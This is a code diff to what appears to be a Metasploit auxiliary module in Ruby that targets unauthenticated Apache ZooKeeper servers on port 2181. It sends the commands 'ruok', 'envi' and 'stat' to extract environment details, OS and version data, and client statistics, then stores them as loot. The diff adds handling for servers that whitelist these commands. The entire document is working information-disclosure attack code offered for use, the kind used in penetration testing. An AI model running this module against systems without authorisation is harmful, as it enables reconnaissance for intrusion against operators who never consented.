@@ -12,11 +12,11 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
                       'Name' => 'Apache ZooKeeper Information Disclosure',
                       'Description' => '
-        Apache Zookeeper server service runs on TCP 2181 and by default, it is accessible without any authentication. This module targets Apache ZooKeeper service instances to extract information about the system environment, and service statistics.
+        Apache ZooKeeper server service runs on TCP 2181 and by default, it is accessible without any authentication. This module targets Apache ZooKeeper service instances to extract information about the system environment, and service statistics.
       ',
                       'References' =>
                         [
-                          ['URL', 'https://zookeeper.apache.org/doc/current/zookeeperAdmin.html']
+                          ['URL', 'https://zooKeeper.apache.org/doc/current/zookeeperAdmin.html']
                         ],
                       'Author' =>
                         [
@@ -43,55 +43,72 @@ class MetasploitModule < Msf::Auxiliary
     begin
       ::Timeout.timeout(to) do
         connect
-        print_status('Verifying if server is responding...')
+        print_status('Verifying if service is responsive...')
         sock.put('ruok')
         data = sock.get_once(-1, to).to_s
 
-        if data && data.to_s =~ /imok/
-          print_good("Server says: #{data}. Going ahead with extraction..\n")
-          connect
-          print_status('Dumping environment info...')
-          sock.put('environ')
-          data = sock.get_once(-1, to).to_s
-          print_good(data.to_s)
+        if data && (data.to_s =~ /imok/ || data.to_s =~ /whitelist/)
+          print_good("Service looks fine. Going ahead with extraction..\n")
           sock.close
 
-          loot_name = 'environ-log'
-          loot_type = 'text/plain'
-          loot_desc = 'Zookeeper Environment Log'
-          loot_service = 'Zookeeper'
-          p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
-          print_good("File saved in: #{p} \n")
+          connect
+          print_status('Dumping environment info...')
+          sock.put('envi')
+          data = sock.get_once(-1, to).to_s
 
-          version = data.match(/zookeeper.version=\s*\S*/).to_s.split('=')[1].split(',')[0]
-          hname = data.match(/host.name=\s*\S*/).to_s.split('=')[1]
-          os_type = data.match(/os.name=\s*\S*/).to_s.split('=')[1]
-          os_arch = data.match(/os.arch=\s*\S*/).to_s.split('=')[1]
-          os_ver = data.match(/os.version=\s*\S*/).to_s.split('=')[1]
-          os = os_type.to_s + " " + os_arch.to_s + " " + os_ver.to_s
+          if data && (data.to_s !~ /whitelist/)
+            print_good(data.to_s)
+            sock.close
 
-          host_info = {
-            host: rhost,
-            os_name: os_type,
-            name: hname,
-            comments: os
-          }
-          report_host(host_info)
-          report_service(host: rhost, port: rport, name: 'Zookeeper', info: "Apache Zookeeper: #{version}")
+            loot_name = 'environ-log'
+            loot_type = 'text/plain'
+            loot_desc = 'ZooKeeper Environment Log'
+            loot_service = 'ZooKeeper'
+            p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
+            print_good("File saved in: #{p} \n")
+
+            version = data.match(/zookeeper.version=\s*\S*/).to_s.split('=')[1].split(',')[0]
+            hname = data.match(/host.name=\s*\S*/).to_s.split('=')[1]
+            os_type = data.match(/os.name=\s*\S*/).to_s.split('=')[1]
+            os_arch = data.match(/os.arch=\s*\S*/).to_s.split('=')[1]
+            os_ver = data.match(/os.version=\s*\S*/).to_s.split('=')[1]
+            os = os_type.to_s + " " + os_arch.to_s + " " + os_ver.to_s
+
+            host_info = {
+              host: rhost,
+              os_name: os_type,
+              name: hname,
+              comments: os
+            }
+            report_host(host_info)
+            report_service(host: rhost, port: rport, name: 'ZooKeeper', info: "Apache ZooKeeper: #{version}")
+          else
+            print_error('Server does not allow accessing environment information.')
+            host_info = {
+              host: rhost
+            }
+            report_host(host_info)
+            report_service(host: rhost, port: rport, name: 'ZooKeeper', info: 'Apache ZooKeeper')
+          end
 
           connect
           print_status('Dumping statistics about performance and connected clients...')
           sock.put('stat')
           data = sock.get_once(-1, to).to_s
-          print_good(data.to_s)
-          sock.close
 
-          loot_name = 'stat-log'
-          loot_type = 'text/plain'
-          loot_desc = 'Zookeeper Stat Log'
-          loot_service = 'Zookeeper'
-          p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
-          print_good("File saved in: #{p} \n")
+          if data && (data.to_s !~ /whitelist/)
+            print_good(data.to_s)
+            sock.close
+
+            loot_name = 'stat-log'
+            loot_type = 'text/plain'
+            loot_desc = 'ZooKeeper Stat Log'
+            loot_service = 'ZooKeeper'
+            p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
+            print_good("File saved in: #{p} \n")
+          else
+            print_error('Server does not allow accessing statistics.')
+          end
         else
           print_error('No good response from server. Exiting.')
         end
